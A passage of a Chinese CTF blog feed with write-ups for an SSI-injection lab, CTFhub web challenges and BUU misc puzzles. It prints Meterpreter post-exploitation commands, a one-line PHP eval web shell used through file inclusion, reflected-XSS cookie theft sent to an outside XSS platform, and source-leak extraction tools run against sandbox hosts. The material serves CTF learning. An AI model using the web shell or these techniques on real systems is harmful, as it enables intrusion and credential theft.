src="https://img-blog.csdnimg.cn/20200801175815913.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>输入<code>?</code>可以查看当前可执行的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                Backgrounds the current session</span><br><span class="line">    <span class="built_in">bg</span>                        Alias <span class="keyword">for</span> background</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    disable_unicode_encoding  Disables encoding of unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of unicode strings</span><br><span class="line">    <span class="built_in">exit</span>                      Terminate the meterpreter session</span><br><span class="line">    get_timeouts              Get the current session timeout values</span><br><span class="line">    guid                      Get the session GUID</span><br><span class="line">    <span class="built_in">help</span>                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    irb                       Open an interactive Ruby shell on the current session</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    migrate                   Migrate the server to another process</span><br><span class="line">    pry                       Open the Pry debugger on the current session</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    <span class="built_in">read</span>                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored <span class="keyword">in</span> a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    secure                    (Re)Negotiate TLV packet encryption on the session</span><br><span class="line">    sessions                  Quickly switch to another session</span><br><span class="line">    set_timeouts              Set the current session timeout values</span><br><span class="line">    sleep                     Force Meterpreter to go quiet, <span class="keyword">then</span> re-establish session.</span><br><span class="line">    transport                 Change the current transport mechanism</span><br><span class="line">    use                       Deprecated <span class="built_in">alias</span> <span class="keyword">for</span> <span class="string">&quot;load&quot;</span></span><br><span class="line">    uuid                      Get the UUID <span class="keyword">for</span> the current session</span><br><span class="line">    write                     Writes data to a channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: File system Commands</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    cat           Read the contents of a file to the screen</span><br><span class="line">    <span class="built_in">cd</span>            Change directory</span><br><span class="line">    checksum      Retrieve the checksum of a file</span><br><span class="line">    chmod         Change the permissions of a file</span><br><span class="line">    cp            Copy <span class="built_in">source</span> to destination</span><br><span class="line">    dir           List files (<span class="built_in">alias</span> <span class="keyword">for</span> ls)</span><br><span class="line">    download      Download a file or directory</span><br><span class="line">    edit          Edit a file</span><br><span class="line">    getlwd        Print <span class="built_in">local</span> working directory</span><br><span class="line">    getwd         Print working directory</span><br><span class="line">    lcd           Change <span class="built_in">local</span> working directory</span><br><span class="line">    lls           List <span class="built_in">local</span> files</span><br><span class="line">    lpwd          Print <span class="built_in">local</span> working directory</span><br><span class="line">    ls            List files</span><br><span class="line">    mkdir         Make directory</span><br><span class="line">    mv            Move <span class="built_in">source</span> to destination</span><br><span class="line">    <span class="built_in">pwd</span>           Print working directory</span><br><span class="line">    rm            Delete the specified file</span><br><span class="line">    rmdir         Remove directory</span><br><span class="line">    search        Search <span class="keyword">for</span> files</span><br><span class="line">    upload        Upload a file or directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Networking Commands</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ifconfig      Display interfaces</span><br><span class="line">    ipconfig      Display interfaces</span><br><span class="line">    portfwd       Forward a <span class="built_in">local</span> port to a remote service</span><br><span class="line">    resolve       Resolve a <span class="built_in">set</span> of host names on the target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: System Commands</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    execute       Execute a <span class="built_in">command</span></span><br><span class="line">    getenv        Get one or more environment variable values</span><br><span class="line">    getpid        Get the current process identifier</span><br><span class="line">    getuid        Get the user that the server is running as</span><br><span class="line">    <span class="built_in">kill</span>          Terminate a process</span><br><span class="line">    localtime     Displays the target system<span class="string">&#x27;s local date and time</span></span><br><span class="line"><span class="string">    pgrep         Filter processes by name</span></span><br><span class="line"><span class="string">    pkill         Terminate processes by name</span></span><br><span class="line"><span class="string">    ps            List running processes</span></span><br><span class="line"><span class="string">    shell         Drop into a system command shell</span></span><br><span class="line"><span class="string">    sysinfo       Gets information about the remote system, such as OS</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Stdapi: Audio Output Commands</span></span><br><span class="line"><span class="string">=============================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Command       Description</span></span><br><span class="line"><span class="string">    -------       -----------</span></span><br><span class="line"><span class="string">    play          play a waveform audio file (.wav) on the target system</span></span><br></pre></td></tr></table></figure><p>输入shell进行利用，再查看id，发现当前登录的只是一个普通用户，而不是root用户<br><img src="https://img-blog.csdnimg.cn/20200801175832732.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>终端可以选择进行优化一下，就是让其显示用户名和主机名，和kali的终端形式那样。</p><p>python -c ‘import pty;pty.spawn(“/bin/bash”)’</p><p>然后就是提权，靶场没有设置flag值，目的是为了学习SSI注入，所以就不再继续进行下去了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于SSI漏洞服务器有很多过滤机制，需要进行绕过，比如大小写。</p><p>防御措施：</p><p>一、进行过滤，过滤这些语法中的特殊字符</p><p>二、关闭服务器SSI相关功能</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFhub技能树web &amp; BUU杂项</title>
      <link href="/2020/08/23/CTFhub%E6%8A%80%E8%83%BD%E6%A0%91web%20&amp;%20BUU%E6%9D%82%E9%A1%B9%E7%AD%89/"/>
      <url>/2020/08/23/CTFhub%E6%8A%80%E8%83%BD%E6%A0%91web%20&amp;%20BUU%E6%9D%82%E9%A1%B9%E7%AD%89/</url>
      
        <content type="html"><![CDATA[<h2 id="xss反射型"><a href="#xss反射型" class="headerlink" title="xss反射型"></a>xss反射型</h2><p>xss先查看源码。找一下插入点<br><img src="https://img-blog.csdnimg.cn/20200803164210765.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>那随便插一个xss，其实没有过滤，直接弹窗了。<br><img src="https://img-blog.csdnimg.cn/20200803164948840.jpg" alt="m0re" loading="lazy"><br>但是没有得到flag，然后看了大佬wp，才知道是要打出来cookie，注册一个xss平台，创建一个项目<br><img src="https://img-blog.csdnimg.cn/20200803173003609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后复制一下环境的URL，在name后面加上payload<br><img src="https://img-blog.csdnimg.cn/20200803173458584.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后send，返回结果成功，回到xss平台查看项目<br><img src="https://img-blog.csdnimg.cn/20200803173622599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><img src="https://img-blog.csdnimg.cn/20200803200133551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>shell.txt里面是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_REQUEST[<span class="string">&#x27;ctfhub&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>request默认包含get和post方式，原本不知道，看了大佬的wp才学习到一个新姿势<br>使用file包含shell.txt然后结合利用命令执行<br><img src="https://img-blog.csdnimg.cn/20200803200421834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后查看根目录<br><img src="https://img-blog.csdnimg.cn/20200803200557618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>发现flag然后就是查看flag，用cat就可以。</p><h2 id="git泄露——log"><a href="#git泄露——log" class="headerlink" title="git泄露——log"></a>git泄露——log</h2><p>需要用到工具Githack这个工具——🔑<a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a><br>目前只支持python2，还有就是，使用这个工具需要安装git<br>先用工具处理一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://challenge-ade6802494a678e6.sandbox.ctfhub.com:10080//.git/</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020080500132969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后切换至dist中的目录，使用命令<code>git log</code>查看历史记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200805001636818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后diff一下remove的时候的提交记录。<br><img src="https://img-blog.csdnimg.cn/2020080500172177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>第二种方法<br>使用命令<code>git reset </code>切换到add flag时的版本，就可以看到目录下生成了几个文件，点开txt文件就可以看到flag了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 9606461bae67fe7941a3b4049d89be560a6e9386</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200805002022565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="git泄露——Stash"><a href="#git泄露——Stash" class="headerlink" title="git泄露——Stash"></a>git泄露——Stash</h2><p>仍然使用Githack进行处理<br>接下来使用<code>git stash list</code>查看<br><img src="https://img-blog.csdnimg.cn/20200805003531552.png" alt="m0re" loading="lazy"><br>再使用命令<code>git stash pop</code>从 git 栈中弹出来一个文件，文件内有flag<br><img src="https://img-blog.csdnimg.cn/20200805003646192.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="git泄露——Index"><a href="#git泄露——Index" class="headerlink" title="git泄露——Index"></a>git泄露——Index</h2><p>步骤跟log一模一样就可以，详细的不写了，直接贴个图叭。<br><img src="https://img-blog.csdnimg.cn/2020080500431126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2><p>使用工具——🔑<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><br>这个工具也可解决svn泄露的题，但是我没有找到flag，找了wp，复现没成功。然后就放弃了。不过hg泄露也是没成功。懒得总结了，就直接写新知识。<br>命令就这个，其他全靠找。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rip-hg.pl -v -u http://challenge-96fb44c6e263bd06.sandbox.ctfhub.com:10080/.hg/</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200805114627567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>情况呢，就是这么个情况，了解了这个知识就可以了，最起码操作是会了，找不到flag这个问题，不纠结了。<br><img src="https://img-blog.csdnimg.cn/20200805114702478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>都不用爆破的，都是admin</p><h2 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h2><p>用户名：<code>eyougw </code><br>密码：<code>admin@(eyou)</code><br>看大佬的wp是这样的。害，还是太年轻。</p><h2 id="迟来的签到题"><a href="#迟来的签到题" class="headerlink" title="迟来的签到题"></a>迟来的签到题</h2><p>这个题，试了几种常见的密码，没有效果啊。有点头大，莫得思路。找了wp看的。发现这个题是有个提示的，但是CTFhub里没写。<br>提示：<code>easy xor???</code><br>使用python2编写的脚本，这个是在网上找的。<br><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/83041029">https://blog.csdn.net/xiangshangbashaonian/article/details/83041029</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">b=b64decode(<span class="string">&quot;AAoHAR1WX1VQVlNVU1VRUl5XXyMjI1FWJ1IjUCQnXlZWXyckXhs=&quot;</span>)</span><br><span class="line"> </span><br><span class="line">data=list(b)<span class="comment">#转成列表</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">    </span><br><span class="line">    flag=<span class="string">&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line"> </span><br><span class="line">        flag+=chr(ord(data[i])^k)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">print</span> flag+<span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><p>尝试编写python3的，但是失败了。在评论区看到一个大佬写的python3的，但是在这道题中用不了。我的是python3.7运行失败。<br>不过这个博主好像是我们学校的大佬。😁应该早就毕业了。不认识！</p><h2 id="还原大师"><a href="#还原大师" class="headerlink" title="还原大师"></a>还原大师</h2><p><img src="https://img-blog.csdnimg.cn/2020073013281657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env/python</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">m = <span class="string">&#x27;TASC?O3RJMV?WDJKX?ZM&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    temp1 = m.replace(<span class="string">&#x27;?&#x27;</span>,str(chr(<span class="number">65</span>+i)),<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">        temp2 = temp1.replace(<span class="string">&#x27;?&#x27;</span>,chr(<span class="number">65</span>+j),<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">            temp3 = temp2.replace(<span class="string">&#x27;?&#x27;</span>,chr(<span class="number">65</span>+k),<span class="number">1</span>)</span><br><span class="line">            s = hashlib.md5(temp3.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest().upper()</span><br><span class="line">            <span class="keyword">if</span> s[:<span class="number">4</span>] == <span class="string">&#x27;E903&#x27;</span>:</span><br><span class="line">                print(s)</span><br></pre></td></tr></table></figure><p>原字符串有三个位置是不知道的，所以需要三个循环语句对这三个位置进行暴力猜解，最后使用切片判断字符串的大写MD5前四位是不是匹配<code>E903</code>，如果匹配就是flag</p><h2 id="GUET-CTF2019-虚假的压缩包"><a href="#GUET-CTF2019-虚假的压缩包" class="headerlink" title="[GUET-CTF2019]虚假的压缩包"></a>[GUET-CTF2019]虚假的压缩包</h2><p>两个压缩包，一个虚假的压缩包，一个真实的压缩包。拖进010editor查看，虚假的压缩包是伪加密，破解得到一个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数学题</span><br><span class="line">n = 33</span><br><span class="line">e = 3</span><br><span class="line">解26</span><br><span class="line"></span><br><span class="line">-------------------------</span><br><span class="line">答案是</span><br></pre></td></tr></table></figure><p>一个简单的rsa，应该都用不到gmpy2这个模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">33</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">m=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> m&lt;<span class="number">100</span>:</span><br><span class="line">    c=(m**e)%n</span><br><span class="line">    <span class="keyword">if</span> (c==<span class="number">26</span>):</span><br><span class="line">        print(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line">        print(<span class="string">&quot;m=&quot;</span>,m)</span><br><span class="line">    m+=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>简单的爆破，<br><img src="https://img-blog.csdnimg.cn/20200808144603165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>尝试密码，5是对的。所以真实的压缩包密码是<code>答案是5</code><br>得到一张图片和一个文件<br>查看图片，看到图片宽高不一致，于是就改的长一点<br><img src="https://img-blog.csdnimg.cn/20200808144938470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>看到了隐藏信息<br><img src="https://img-blog.csdnimg.cn/20200808145040296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br><code>^5</code>异或5，呃呃呃，异或应该是脚本(默默去百度了大佬的wp)<br>python2的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f1 = open(<span class="string">&#x27;./cxk&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">xor_data = f1.read()</span><br><span class="line">f1.close()</span><br><span class="line">dec_data = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xor_data:</span><br><span class="line">    tmp = int(i,<span class="number">16</span>) ^ <span class="number">5</span></span><br><span class="line">    dec_data += hex(tmp)[<span class="number">2</span>:]</span><br><span class="line">f2 = open(<span class="string">&#x27;./cxkdemimi.doc&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f2.write(dec_data.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200808170358936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这里隐藏了一段，复制出来粘贴到记事本中就行了。</p><h2 id="SWPU2019-Network"><a href="#SWPU2019-Network" class="headerlink" title="[SWPU2019]Network"></a>[SWPU2019]Network</h2><p><img src="https://img-blog.csdnimg.cn/20200808173024768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>看到这些比较晕，原本移位要画图描点什么的，network也不懂，就是看wp看大佬的思路。<br>先将这四位数字转换成8位二进制的数字，</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">63</span><span class="number">00111111</span></span><br><span class="line"><span class="number">255</span><span class="number">11111111</span></span><br><span class="line"><span class="number">127</span><span class="number">01111111</span></span><br><span class="line"><span class="number">191</span><span class="number">10111111</span></span><br></pre></td></tr></table></figure><p>每个数的前两位提取出来，然后就是提取后的一串数字，四位一组，转换成ascii码，<br>再将ascii码转换成16进制数，可以发现504B，是zip的文件头。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env/python</span></span><br><span class="line">fp = open(<span class="string">&#x27;C:\\Users\\18101\\Desktop\\t.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">a = fp.readlines()</span><br><span class="line">p = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    p.append(int(i))</span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">63</span>:</span><br><span class="line">        a = <span class="string">&#x27;00&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">127</span>:</span><br><span class="line">        a = <span class="string">&#x27;01&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">191</span>:</span><br><span class="line">        a = <span class="string">&#x27;10&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">255</span>:</span><br><span class="line">        a = <span class="string">&#x27;11&#x27;</span></span><br><span class="line">    s += a</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">8</span>):</span><br><span class="line">    flag += chr(int(s[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">flag = binascii.unhexlify(flag)</span><br><span class="line">wp = open(<span class="string">&#x27;C:\\Users\\18101\\Desktop\\ans.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">wp.write(flag)</span><br><span class="line">wp.close()</span><br></pre></td></tr></table></figure><p>压缩包伪加密，好几处伪加密了，所以可以直接使用ZipCenOp直接解。<br>然后base64吧，手都酸了，<br><img 